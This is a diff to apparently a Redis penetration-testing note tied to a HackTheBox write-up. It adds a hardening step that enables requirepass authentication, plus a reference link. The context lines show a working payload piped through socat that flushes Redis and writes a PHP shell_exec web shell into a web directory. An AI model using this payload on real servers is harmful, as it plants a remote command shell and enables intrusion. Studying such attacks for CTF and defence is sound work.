@@ -92,6 +92,12 @@ redis-cli -h 127.0.0.1 save
 echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php shell_exec($_GET["e"]); ?>\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$5\r\nz.php\r\n*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$46\r\n/var/www/html/8924d0549008565c554f8128cd11fda4\r\n*1\r\n$4\r\nSAVE\r\n' | /tmp/socat - TCP:redis:6379
 ```
 
+## Hardening
+
+[Redis force Authentication](https://redis.io/docs/management/security/#authentication)
+```bash
+sudo sed -i 's/# requirepass/requirepass/g' /etc/redis/redis.conf
+```
 ## References
 
 [Redis Commands](https://redis.io/commands/)
@@ -101,3 +107,4 @@ echo -ne '*1\r\n$8\r\nFLUSHALL\r\n*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n<?php she
 [alamot](https://alamot.github.io/reddish_writeup/#getting-www-data-www)
 [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)  
 [0xdf Writeup for Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html) 
+[Redis force Authentication](https://redis.io/docs/management/security/#authentication)
